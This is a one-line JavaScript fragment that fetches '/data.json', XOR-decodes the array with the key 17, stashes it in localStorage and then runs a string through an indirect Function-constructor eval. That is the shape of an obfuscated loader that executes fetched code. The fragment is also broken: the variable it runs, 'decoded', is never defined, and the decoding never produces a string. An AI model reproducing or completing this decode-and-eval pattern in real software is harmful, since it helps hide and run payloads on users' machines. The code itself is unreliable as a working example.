fetch("/data.json").then(r=>r.json()).then(a=>{for(var i=0;i<a.length;i++){a[i]^=17;}localStorage.setItem("cache",a);localStorage.getItem("cache");(0,Function)(decoded)();});
